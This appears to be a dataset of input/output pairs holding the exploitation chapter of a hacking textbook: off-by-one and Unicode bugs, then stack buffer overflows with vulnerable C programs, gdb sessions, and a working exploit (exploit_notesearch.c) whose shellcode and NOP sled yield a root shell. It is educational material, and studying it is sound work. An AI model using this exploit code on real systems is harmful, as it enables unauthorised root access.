    "output": "0x300\nE X P L O I T A T I O N\nProgram exploitation is a staple of hacking. As demon-\nstrated in the previous chapter, a program is made up\nof a complex set of rules following a certain execution\nflow that ultimately tells the computer what to do.\nExploiting a program is simply a clever way of getting\nthe computer to do what you want it to do, even if the\ncurrently running program was designed to prevent that action. Since a\nprogram can really only do what it’s designed to do, the security holes are\nactually flaws or oversights in the design of the program or the environment\nthe program is running in. It takes a creative mind to find these holes and\nto write programs that compensate for them. Sometimes these holes are\nthe products of relatively obvious programmer errors, but there are some\nless obvious errors that have given birth to more complex exploit techniques\nthat can be applied in many different places.\nA program can only do what it’s programmed to do, to the letter of the law.\nUnfortunately, what’s written doesn’t always coincide with what the program-\nmer intended the program to do. This principle can be explained with a joke:\nA man is walking through the woods, and he finds a magic lamp on\nthe ground. Instinctively, he picks the lamp up, rubs the side of it\nwith his sleeve, and out pops a genie. The genie thanks the man for\nfreeing him, and offers to grant him three wishes. The man is ecstatic\nand knows exactly what he wants.\n“First,” says the man, “I want a billion dollars.”\nThe genie snaps his fingers and a briefcase full of money\nmaterializes out of thin air.\nThe man is wide eyed in amazement and continues, “Next, I want\naFerrari.”\nThe genie snaps his fingers and a Ferrari appears from a puff\nofsmoke.\nThe man continues, “Finally, I want to be irresistible to women.”\nThe genie snaps his fingers and the man turns into a box\nofchocolates.\nJust as the man’s final wish was granted based on what he said, rather\nthan what he was thinking, a program will follow its instructions exactly, and\nthe results aren’t always what the programmer intended. Sometimes the\nrepercussions can be catastrophic.\nProgrammers are human, and sometimes what they write isn’t exactly\nwhat they mean. For example, one common programming error is called an\noff-by-one error. As the name implies, it’s an error where the programmer has\nmiscounted by one. This happens more often than you might think, and it is\nbest illustrated with a question: If you’re building a 100-foot fence, with fence\nposts spaced 10 feet apart, how many fence posts do you need? The obvious\nanswer is 10 fence posts, but this is incorrect, since you actually need 11. This\ntype of off-by-one error is commonly called a fencepost error, and it occurs when a\nprogrammer mistakenly counts items instead of spaces between items, or\nvice versa. Another example is when a programmer is trying to select a range of\nnumbers or items for processing, such as items N through M. If N = 5 and M = 17,\nhow many items are there to process? The obvious answer is M - N, or 17 - 5 = 12\nitems. But this is incorrect, since there are actually M - N + 1 items, for a total\nof 13 items. This may seem counterintuitive at first glance, because it is, and\nthat’s exactly why these errors happen.\nOften, fencepost errors go unnoticed because programs aren’t tested for\nevery single possibility, and the effects of a fencepost error don’t generally\noccur during normal program execution. However, when the program is fed\nthe input that makes the effects of the error manifest, the consequences of the\nerror can have an avalanche effect on the rest of the program logic. When\nproperly exploited, an off-by-one error can cause a seemingly secure program\nto become a security vulnerability.\nOne classic example of this is OpenSSH, which is meant to be a secure\nterminal communication program suite, designed to replace insecure and\n116 0x300\nunencrypted services such as telnet, rsh, and rcp. However, there was an off-\nby-one error in the channel-allocation code that was heavily exploited. Specific-\nally, the code included an if statement that read:\nif (id < 0 || id > channels_alloc) {\nIt should have been\nif (id < 0 || id >= channels_alloc) {\nIn plain English, the code reads If the ID is less than 0 or the ID is greater\nthan the channels allocated, do the following stuff, when it should have been If the\nID is less than 0 or the ID is greater than or equal to the channels allocated, do the\nfollowing stuff.\nThis simple off-by-one error allowed further exploitation of the pro-\ngram, so that a normal user authenticating and logging in could gain full\nadministrative rights to the system. This type of functionality certainly wasn’t\nwhat the programmers had intended for a secure program like OpenSSH,\nbut a computer can only do what it’s told.\nAnother situation that seems to breed exploitable programmer errors is\nwhen a program is quickly modified to expand its functionality. While this\nincrease in functionality makes the program more marketable and increases\nits value, it also increases the program’s complexity, which increases the\nchances of an oversight. Microsoft’s IIS webserver program is designed to\nserve static and interactive web content to users. In order to accomplish this,\nthe program must allow users to read, write, and execute programs and files\nwithin certain directories; however, this functionality must be limited to those\nparticular directories. Without this limitation, users would have full control of\nthe system, which is obviously undesirable from a security perspective. To\nprevent this situation, the program has path-checking code designed to\nprevent users from using the backslash character to traverse backward through\nthe directory tree and enter other directories.\nWith the addition of support for the Unicode character set, though, the\ncomplexity of the program continued to increase. Unicode is a double-byte\ncharacter set designed to provide characters for every language, including\nChinese and Arabic. By using two bytes for each character instead of just one,\nUnicode allows for tens of thousands of possible characters, as opposed to\nthe few hundred allowed by single-byte characters. This additional complexity\nmeans that there are now multiple representations of the backslash charac-\nter. For example, %5c in Unicode translates to the backslash character, but\nthis translation was done after the path-checking code had run. So by using\n%5c instead of \\, it was indeed possible to traverse directories, allowing\ntheaforementioned security dangers. Both the Sadmind worm and the\nCodeRed worm used this type of Unicode conversion oversight to deface\nweb pages.\nA related example of this letter-of-the-law principle used outside the\nrealm of computer programming is the LaMacchia Loophole. Just like the\nrules of a computer program, the US legal system sometimes has rules that\nExploitation 117"
  },
  {
    "input": "0x310 Generalized Exploit Techniques",
    "output": "don’t say exactly what their creators intended, and like a computer program\nexploit, these legal loopholes can be used to sidestep the intent of the law.\nNear the end of 1993, a 21-year-old computer hacker and student at MIT\nnamed David LaMacchia set up a bulletin board system called Cynosure for\nthe purposes of software piracy. Those who had software to give would upload\nit, and those who wanted software would download it. The service was only\nonline for about six weeks, but it generated heavy network traffic worldwide,\nwhich eventually attracted the attention of university and federal authorities.\nSoftware companies claimed that they lost one million dollars as a result of\nCynosure, and a federal grand jury charged LaMacchia with one count of\nconspiring with unknown persons to violate the wire fraud statue. However,\nthe charge was dismissed because what LaMacchia was alleged to have done\nwasn’t criminal conduct under the Copyright Act, since the infringement\nwas not for the purpose of commercial advantage or private financial gain.\nApparently, the lawmakers had never anticipated that someone might engage\nin these types of activities with a motive other than personal financial gain.\n(Congress closed this loophole in 1997 with the No Electronic Theft Act.)\nEven though this example doesn’t involve the exploiting of a computer\nprogram, the judges and courts can be thought of as computers executing\nthe program of the legal system as it was written. The abstract concepts of\nhacking transcend computing and can be applied to many other aspects\noflife that involve complex systems.\n0x310 Generalized Exploit Techniques\nOff-by-one errors and improper Unicode expansion are all mistakes that can\nbe hard to see at the time but are glaringly obvious to any programmer in\nhindsight. However, there are some common mistakes that can be exploited\nin ways that aren’t so obvious. The impact of these mistakes on security isn’t\nalways apparent, and these security problems are found in code everywhere.\nBecause the same type of mistake is made in many different places, general-\nized exploit techniques have evolved to take advantage of these mistakes, and\nthey can be used in a variety of situations.\nMost program exploits have to do with memory corruption. These include\ncommon exploit techniques like buffer overflows as well as less-common\nmethods like format string exploits. With these techniques, the ultimate goal\nis to take control of the target program’s execution flow by tricking it into\nrunning a piece of malicious code that has been smuggled into memory.\nThis type of process hijacking is known as execution of arbitrary code, since the\nhacker can cause a program to do pretty much anything he or she wants it to.\nLike the LaMacchia Loophole, these types of vulnerabilities exist because\nthere are specific unexpected cases that the program can’t handle. Under\nnormal conditions, these unexpected cases cause the program to crash—\nmetaphorically driving the execution flow off a cliff. But if the environment\nis carefully controlled, the execution flow can be controlled—preventing the\ncrash and reprogramming the process.\n118 0x300"
  },
  {
    "input": "0x320 Buffer Overflows",
    "output": "0x320 Buffer Overflows\nBuffer overflow vulnerabilities have been around since the early days of com-\nputers and still exist today. Most Internet worms use buffer overflow vulner-\nabilities to propagate, and even the most recent zero-day VML vulnerability\nin Internet Explorer is due to a buffer overflow.\nC is a high-level programming language, but it assumes that the\nprogrammer is responsible for data integrity. If this responsibility were\nshifted over to the compiler, the resulting binaries would be significantly\nslower, due to integrity checks on every variable. Also, this would remove a\nsignificant level of control from the programmer and complicate the\nlanguage.\nWhile C’s simplicity increases the programmer’s control and the efficiency\nof the resulting programs, it can also result in programs that are vulnerable\nto buffer overflows and memory leaks if the programmer isn’t careful. This\nmeans that once a variable is allocated memory, there are no built-in safe-\nguards to ensure that the contents of a variable fit into the allocated memory\nspace. If a programmer wants to put ten bytes of data into a buffer that had\nonly been allocated eight bytes of space, that type of action is allowed, even\nthough it will most likely cause the program to crash. This is known as a\nbuffer overrun or buffer overflow, since the extra two bytes of data will overflow\nand spill out of the allocated memory, overwriting whatever happens to\ncome next. If a critical piece of data is overwritten, the program will crash.\nThe overflow_example.c code offers an example.\noverflow_example.c\n#include <stdio.h>\n#include <string.h>\nint main(int argc, char *argv[]) {\nint value = 5;\nchar buffer_one[8], buffer_two[8];\nstrcpy(buffer_one, \"one\"); /* Put \"one\" into buffer_one. */\nstrcpy(buffer_two, \"two\"); /* Put \"two\" into buffer_two. */\nprintf(\"[BEFORE] buffer_two is at %p and contains \\'%s\\'\\n\", buffer_two, buffer_two);\nprintf(\"[BEFORE] buffer_one is at %p and contains \\'%s\\'\\n\", buffer_one, buffer_one);\nprintf(\"[BEFORE] value is at %p and is %d (0x%08x)\\n\", &value, value, value);\nprintf(\"\\n[STRCPY] copying %d bytes into buffer_two\\n\\n\", strlen(argv[1]));\nstrcpy(buffer_two, argv[1]); /* Copy first argument into buffer_two. */\nprintf(\"[AFTER] buffer_two is at %p and contains \\'%s\\'\\n\", buffer_two, buffer_two);\nprintf(\"[AFTER] buffer_one is at %p and contains \\'%s\\'\\n\", buffer_one, buffer_one);\nprintf(\"[AFTER] value is at %p and is %d (0x%08x)\\n\", &value, value, value);\n}\nExploitation 119\nBy now, you should be able to read the source code above and figure out\nwhat the program does. After compilation in the sample output below, we try\nto copy ten bytes from the first command-line argument into buffer_two, which\nonly has eight bytes allocated for it.\nreader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c\nreader@hacking:~/booksrc $ ./overflow_example 1234567890\n[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'\n[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)\n[STRCPY] copying 10 bytes into buffer_two\n[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'\n[AFTER] buffer_one is at 0xbffff7f8 and contains '90'\n[AFTER] value is at 0xbffff804 and is 5 (0x00000005)\nreader@hacking:~/booksrc $\nNotice that buffer_one is located directly after buffer_two in memory, so\nwhen ten bytes are copied into buffer_two, the last two bytes of 90 overflow\ninto buffer_one and overwrite whatever was there.\nA larger buffer will naturally overflow into the other variables, but if a large\nenough buffer is used, the program will crash and die.\nreader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n[STRCPY] copying 29 bytes into buffer_two\n[AFTER] buffer_two is at 0xbffff7e0 and contains\n'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'\n[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)\nSegmentation fault (core dumped)\nreader@hacking:~/booksrc $\nThese types of program crashes are fairly common—think of all of the\ntimes a program has crashed or blue-screened on you. The programmer’s\nmistake is one of omission—there should be a length check or restriction on\nthe user-supplied input. These kinds of mistakes are easy to make and can be\ndifficult to spot. In fact, the notesearch.c program on page93 contains a buffer\noverflow bug. You might not have noticed this until right now, even if you\nwere already familiar with C.\nreader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n-------[ end of note data ]-------\nSegmentation fault\nreader@hacking:~/booksrc $\n120 0x300\nProgram crashes are annoying, but in the hands of a hacker they can\nbecome downright dangerous. A knowledgeable hacker can take control of a\nprogram as it crashes, with some surprising results. The exploit_notesearch.c\ncode demonstrates the danger.\nexploit_notesearch.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\nint main(int argc, char *argv[]) {\nunsigned int i, *ptr, ret, offset=270;\nchar *command, *buffer;\ncommand = (char *) malloc(200);\nbzero(command, 200); // Zero out the new memory.\nstrcpy(command, \"./notesearch \\'\"); // Start command buffer.\nbuffer = command + strlen(command); // Set buffer at the end.\nif(argc > 1) // Set offset.\noffset = atoi(argv[1]);\nret = (unsigned int) &i - offset; // Set return address.\nfor(i=0; i < 160; i+=4) // Fill buffer with return address.\n*((unsigned int *)(buffer+i)) = ret;\nmemset(buffer, 0x90, 60); // Build NOP sled.\nmemcpy(buffer+60, shellcode, sizeof(shellcode)-1);\nstrcat(command, \"\\'\");\nsystem(command); // Run exploit.\nfree(command);\n}\nThis exploit’s source code will be explained in depth later, but in general,\nit’s just generating a command string that will execute the notesearch pro-\ngram with a command-line argument between single quotes. It uses string\nfunctions to do this: strlen() to get the current length of the string (to position\nthe buffer pointer) and strcat() to concatenate the closing single quote to the\nend. Finally, the system function is used to execute the command string.\nThe buffer that is generated between the single quotes is the real meat of the\nexploit. The rest is just a delivery method for this poison pill of data. Watch\nwhat a controlled crash can do.\nExploitation 121"
  },
  {
    "input": "0x321 Stack-Based Buffer Overflow Vulnerabilities",
    "output": "reader@hacking:~/booksrc $ gcc exploit_notesearch.c\nreader@hacking:~/booksrc $ ./a.out\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nsh-3.2#\nThe exploit is able to use the overflow to serve up a root shell—providing\nfull control over the computer. This is an example of a stack-based buffer\noverflow exploit.\n0x321 Stack-Based Buffer Overflow Vulnerabilities\nThe notesearch exploit works by corrupting memory to control execution\nflow. The auth_overflow.c program demonstrates this concept.\nauth_overflow.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint check_authentication(char *password) {\nint auth_flag = 0;\nchar password_buffer[16];\nstrcpy(password_buffer, password);\nif(strcmp(password_buffer, \"brillig\") == 0)\nauth_flag = 1;\nif(strcmp(password_buffer, \"outgrabe\") == 0)\nauth_flag = 1;\nreturn auth_flag;\n}\nint main(int argc, char *argv[]) {\nif(argc < 2) {\nprintf(\"Usage: %s <password>\\n\", argv[0]);\nexit(0);\n}\nif(check_authentication(argv[1])) {\nprintf(\"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\nprintf(\" Access Granted.\\n\");\nprintf(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n} else {\nprintf(\"\\nAccess Denied.\\n\");\n}\n}\nThis example program accepts a password as its only command-line\nargument and then calls a check_authentication() function. This function\nallows two passwords, meant to be representative of multiple authentication\n122 0x300\nmethods. If either of these passwords is used, the function returns 1, which\ngrants access. You should be able to figure most of that out just by looking at\nthe source code before compiling it. Use the -g option when you do compile\nit, though, since we will be debugging this later.\nreader@hacking:~/booksrc $ gcc -g -o auth_overflow auth_overflow.c\nreader@hacking:~/booksrc $ ./auth_overflow\nUsage: ./auth_overflow <password>\nreader@hacking:~/booksrc $ ./auth_overflow test\nAccess Denied.\nreader@hacking:~/booksrc $ ./auth_overflow brillig\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nAccess Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nreader@hacking:~/booksrc $ ./auth_overflow outgrabe\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nAccess Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nreader@hacking:~/booksrc $\nSo far, everything works as the source code says it should. This is to be\nexpected from something as deterministic as a computer program. But an\noverflow can lead to unexpected and even contradictory behavior, allowing\naccess without a proper password.\nreader@hacking:~/booksrc $ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nAccess Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nreader@hacking:~/booksrc $\nYou may have already figured out what happened, but let’s look at this\nwith a debugger to see the specifics of it.\nreader@hacking:~/booksrc $ gdb -q ./auth_overflow\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1 #include <stdio.h>\n2 #include <stdlib.h>\n3 #include <string.h>\n4\n5 int check_authentication(char *password) {\n6 int auth_flag = 0;\n7 char password_buffer[16];\n8\n9 strcpy(password_buffer, password);\n10\n(gdb)\nExploitation 123\n11 if(strcmp(password_buffer, \"brillig\") == 0)\n12 auth_flag = 1;\n13 if(strcmp(password_buffer, \"outgrabe\") == 0)\n14 auth_flag = 1;\n15\n16 return auth_flag;\n17 }\n18\n19 int main(int argc, char *argv[]) {\n20 if(argc < 2) {\n(gdb) break 9\nBreakpoint 1 at 0x8048421: file auth_overflow.c, line 9.\n(gdb) break 16\nBreakpoint 2 at 0x804846f: file auth_overflow.c, line 16.\n(gdb)\nThe GDB debugger is started with the -q option to suppress the welcome\nbanner, and breakpoints are set on lines 9 and 16. When the program is run,\nexecution will pause at these breakpoints and give us a chance to examine\nmemory.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/reader/booksrc/auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBreakpoint 1, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at\nauth_overflow.c:9\n9 strcpy(password_buffer, password);\n(gdb) x/s password_buffer\n0xbffff7a0: \")????o??????)\\205\\004\\b?o??p???????\"\n(gdb) x/x &auth_flag\n0xbffff7bc: 0x00000000\n(gdb) print 0xbffff7bc - 0xbffff7a0\n$1 = 28\n(gdb) x/16xw password_buffer\n0xbffff7a0: 0xb7f9f729 0xb7fd6ff4 0xbffff7d8 0x08048529\n0xbffff7b0: 0xb7fd6ff4 0xbffff870 0xbffff7d8 0x00000000\n0xbffff7c0: 0xb7ff47b0 0x08048510 0xbffff7d8 0x080484bb\n0xbffff7d0: 0xbffff9af 0x08048510 0xbffff838 0xb7eafebc\n(gdb)\nThe first breakpoint is before the strcpy() happens. By examining\nthepassword_buffer pointer, the debugger shows it is filled with random\nuninitialized data and is located at 0xbffff7a0 in memory. By examining the\naddress of the auth_flag variable, we can see both its location at 0xbffff7bc\nand its value of 0. The print command can be used to do arithmetic and shows\nthat auth_flag is 28 bytes past the start of password_buffer. This relationship\ncan also be seen in a block of memory starting at password_buffer. The loca-\ntion of auth_flag is shown in bold.\n124 0x300\n(gdb) continue\nContinuing.\nBreakpoint 2, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at\nauth_overflow.c:16\n16 return auth_flag;\n(gdb) x/s password_buffer\n0xbffff7a0: 'A' <repeats 30 times>\n(gdb) x/x &auth_flag\n0xbffff7bc: 0x00004141\n(gdb) x/16xw password_buffer\n0xbffff7a0: 0x41414141 0x41414141 0x41414141 0x41414141\n0xbffff7b0: 0x41414141 0x41414141 0x41414141 0x00004141\n0xbffff7c0: 0xb7ff47b0 0x08048510 0xbffff7d8 0x080484bb\n0xbffff7d0: 0xbffff9af 0x08048510 0xbffff838 0xb7eafebc\n(gdb) x/4cb &auth_flag\n0xbffff7bc: 65 'A' 65 'A' 0 '\\0' 0 '\\0'\n(gdb) x/dw &auth_flag\n0xbffff7bc: 16705\n(gdb)\nContinuing to the next breakpoint found after the strcpy(), these memory\nlocations are examined again. The password_buffer overflowed into the auth_flag,\nchanging its first two bytes to 0x41. The value of 0x00004141 might look backward\nagain, but remember that x86 has little-endian architecture, so it’s supposed to\nlook that way. If you examine each of these four bytes individually, you can see\nhow the memory is actually laid out. Ultimately, the program will treat this\nvalue as an integer, with a value of 16705.\n(gdb) continue\nContinuing.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nAccess Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nProgram exited with code 034.\n(gdb)\nAfter the overflow, the check_authentication() function will return 16705\ninstead of 0. Since the if statement considers any nonzero value to be authen-\nticated, the program’s execution flow is controlled into the authenticated\nsection. In this example, the auth_flag variable is the execution control point,\nsince overwriting this value is the source of the control.\nBut this is a very contrived example that depends on memory layout of the\nvariables. In auth_overflow2.c, the variables are declared in reverse order.\n(Changes to auth_overflow.c are shown in bold.)\nExploitation 125\nauth_overflow2.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint check_authentication(char *password) {\nchar password_buffer[16];\nint auth_flag = 0;\nstrcpy(password_buffer, password);\nif(strcmp(password_buffer, \"brillig\") == 0)\nauth_flag = 1;\nif(strcmp(password_buffer, \"outgrabe\") == 0)\nauth_flag = 1;\nreturn auth_flag;\n}\nint main(int argc, char *argv[]) {\nif(argc < 2) {\nprintf(\"Usage: %s <password>\\n\", argv[0]);\nexit(0);\n}\nif(check_authentication(argv[1])) {\nprintf(\"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\nprintf(\" Access Granted.\\n\");\nprintf(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n} else {\nprintf(\"\\nAccess Denied.\\n\");\n}\n}\nThis simple change puts the auth_flag variable before the password_buffer\nin memory. This eliminates the use of the return_value variable as an execu-\ntion control point, since it can no longer be corrupted by an overflow.\nreader@hacking:~/booksrc $ gcc -g auth_overflow2.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1 #include <stdio.h>\n2 #include <stdlib.h>\n3 #include <string.h>\n4\n5 int check_authentication(char *password) {\n6 char password_buffer[16];\n7 int auth_flag = 0;\n8\n9 strcpy(password_buffer, password);\n10\n(gdb)\n126 0x300\n11 if(strcmp(password_buffer, \"brillig\") == 0)\n12 auth_flag = 1;\n13 if(strcmp(password_buffer, \"outgrabe\") == 0)\n14 auth_flag = 1;\n15\n16 return auth_flag;\n17 }\n18\n19 int main(int argc, char *argv[]) {\n20 if(argc < 2) {\n(gdb) break 9\nBreakpoint 1 at 0x8048421: file auth_overflow2.c, line 9.\n(gdb) break 16\nBreakpoint 2 at 0x804846f: file auth_overflow2.c, line 16.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBreakpoint 1, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at\nauth_overflow2.c:9\n9 strcpy(password_buffer, password);\n(gdb) x/s password_buffer\n0xbffff7c0: \"?o??\\200????????o???G??\\020\\205\\004\\b?????\\204\\004\\b????\\020\\205\\004\\\nbH???????\\002\"\n(gdb) x/x &auth_flag\n0xbffff7bc: 0x00000000\n(gdb) x/16xw &auth_flag\n0xbffff7bc: 0x00000000 0xb7fd6ff4 0xbffff880 0xbffff7e8\n0xbffff7cc: 0xb7fd6ff4 0xb7ff47b0 0x08048510 0xbffff7e8\n0xbffff7dc: 0x080484bb 0xbffff9b7 0x08048510 0xbffff848\n0xbffff7ec: 0xb7eafebc 0x00000002 0xbffff874 0xbffff880\n(gdb)\nSimilar breakpoints are set, and an examination of memory shows that\nauth_flag (shown in bold above and below) is located before password_buffer\nin memory. This means auth_flag can never be overwritten by an overflow in\npassword_buffer.\n(gdb) cont\nContinuing.\nBreakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)\nat auth_overflow2.c:16\n16 return auth_flag;\n(gdb) x/s password_buffer\n0xbffff7c0: 'A' <repeats 30 times>\n(gdb) x/x &auth_flag\n0xbffff7bc: 0x00000000\n(gdb) x/16xw &auth_flag\n0xbffff7bc: 0x00000000 0x41414141 0x41414141 0x41414141\n0xbffff7cc: 0x41414141 0x41414141 0x41414141 0x41414141\n0xbffff7dc: 0x08004141 0xbffff9b7 0x08048510 0xbffff848\n0xbffff7ec: 0xb7eafebc 0x00000002 0xbffff874 0xbffff880\n(gdb)\nExploitation 127\nAs expected, the overflow cannot disturb the auth_flag variable, since it’s\nlocated before the buffer. But another execution control point does exist,\neven though you can’t see it in the C code. It’s conveniently located after all\nthe stack variables, so it can easily be overwritten. This memory is integral to the\noperation of all programs, so it exists in all programs, and when it’s over-\nwritten, it usually results in a program crash.\n(gdb) c\nContinuing.\nProgram received signal SIGSEGV, Segmentation fault.\n0x08004141 in ?? ()\n(gdb)\nRecall from the previous chapter that the stack is one of five memory\nsegments used by programs. The stack is a FILO data structure used to\nmaintain execution flow and context for local variables during function calls.\nWhen a function is called, a structure called a stack frame is pushed onto\nthe stack, and the EIP register jumps to the\nfirst instruction of the function. Each stack\nreturn_value variable\nframe contains the local variables for that\nfunction and a return address so EIP can be\nrestored. When the function is done, the stack\npassword_buffer variable\nframe is popped off the stack and the return\naddress is used to restore EIP. All of this is built\nin to the architecture and is usually handled by Saved frame pointer (SFP)\nthe compiler, not the programmer.\nWhen the check_authentication() function\nReturn address (ret)\niscalled, a new stack frame is pushed onto the\n*password (func argument)\nstack above main()’s stack frame. In this frame\nare the local variables, a return address, and the main()’s stack frame\nfunction’s arguments.\nWe can see all these elements in the debugger.\nreader@hacking:~/booksrc $ gcc -g auth_overflow2.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1 #include <stdio.h>\n2 #include <stdlib.h>\n3 #include <string.h>\n4\n5 int check_authentication(char *password) {\n6 char password_buffer[16];\n7 int auth_flag = 0;\n8\n9 strcpy(password_buffer, password);\n10\n(gdb)\n11 if(strcmp(password_buffer, \"brillig\") == 0)\n128 0x300\n12 auth_flag = 1;\n13 if(strcmp(password_buffer, \"outgrabe\") == 0)\n14 auth_flag = 1;\n15\n16 return auth_flag;\n17 }\n18\n19 int main(int argc, char *argv[]) {\n20 if(argc < 2) {\n(gdb)\n21 printf(\"Usage: %s <password>\\n\", argv[0]);\n22 exit(0);\n23 }\n24 if(check_authentication(argv[1])) {\n25 printf(\"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n26 printf(\" Access Granted.\\n\");\n27 printf(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n28 } else {\n29 printf(\"\\nAccess Denied.\\n\");\n30 }\n(gdb) break 24\nBreakpoint 1 at 0x80484ab: file auth_overflow2.c, line 24.\n(gdb) break 9\nBreakpoint 2 at 0x8048421: file auth_overflow2.c, line 9.\n(gdb) break 16\nBreakpoint 3 at 0x804846f: file auth_overflow2.c, line 16.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nBreakpoint 1, main (argc=2, argv=0xbffff874) at auth_overflow2.c:24\n24 if(check_authentication(argv[1])) {\n(gdb) i r esp\nesp 0xbffff7e0 0xbffff7e0\n(gdb) x/32xw $esp\n0xbffff7e0: 0xb8000ce0 0x08048510 0xbffff848 0xb7eafebc\n0xbffff7f0: 0x00000002 0xbffff874 0xbffff880 0xb8001898\n0xbffff800: 0x00000000 0x00000001 0x00000001 0x00000000\n0xbffff810: 0xb7fd6ff4 0xb8000ce0 0x00000000 0xbffff848\n0xbffff820: 0x40f5f7f0 0x48e0fe81 0x00000000 0x00000000\n0xbffff830: 0x00000000 0xb7ff9300 0xb7eafded 0xb8000ff4\n0xbffff840: 0x00000002 0x08048350 0x00000000 0x08048371\n0xbffff850: 0x08048474 0x00000002 0xbffff874 0x08048510\n(gdb)\nThe first breakpoint is right before the call to check_authentication()\nin main(). At this point, the stack pointer register (ESP) is 0xbffff7e0, and the\ntop of the stack is shown. This is all part of main()’s stack frame. Continu-\ning to the next breakpoint inside check_authentication(), the output below\nshows ESP is smaller as it moves up the list of memory to make room for\ncheck_authentication()’s stack frame (shown in bold), whic(cid:0)h is now on the\nstack. After findin(cid:2)g the addresses of the auth_flag variable ( ) and the variable\npassword_buffer ( ), their locations can be seen within the stack frame.\nExploitation 129\n(gdb) c\nContinuing.\nBreakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at\nauth_overflow2.c:9\n9 strcpy(password_buffer, password);\n(gdb) i r esp\nesp 0xbffff7a0 0xbffff7a0\n(gdb) x/32xw $esp\n0xbffff7a0: 0x00000000 0x08049744 0xbffff7b8 (cid:0) 0x080482d9\n0xbffff7b0: (cid:2) 0xb7f9f729 0xb7fd6ff4 0xbffff7e8 0x00000000\n0xbffff7c0: 0xb7fd6ff4 0xbffff880 0xbffff7e8 0xb7fd6ff4\n0xbffff7d0: 0xb7ff47b0 0x08048510 0xbffff7e8 0x080484bb\n0xbffff7e0: 0xbffff9b7 0x08048510 0xbffff848 0xb7eafebc\n0xbffff7f0: 0x00000002 0xbffff874 0xbffff880 0xb8001898\n0xbffff800: 0x00000000 0x00000001 0x00000001 0x00000000\n0xbffff810: 0xb7fd6ff4 0xb8000ce0 0x00000000 0xbffff848\n(gdb) p 0xbffff7e0 - 0xbffff7a0\n$1 = 64\n(gdb) x/s password_buffer\n0xbffff7c0: \"?o??\\200????????o???G??\\020\\205\\004\\b?????\\204\\004\\b????\\020\\205\\004\\\nbH???????\\002\"\n(gdb) x/x &auth_flag\n0xbffff7bc: 0x00000000\n(gdb)\nContinuing to the second breakpoint in check_authentication(), a stack\nframe (shown in bold) is pushed onto the stack when the function is called.\nSince the stack grows upward toward lower memory addresses, the stack\npointer is now 64 bytes less at 0xbffff7a0. The size and structure of a stack\nframe can vary greatly, depending on the function and certain compiler\noptimizations. For example, the first 24 bytes of this stack frame are just\npadding put there by the compiler. The local stack variables, auth_flag and\npassword_buffer, are sho(cid:0)wn at their respective memory locations in the stack\nframe. The auth_f(cid:2)lag ( ) is shown at 0xbffff7bc, and the 16 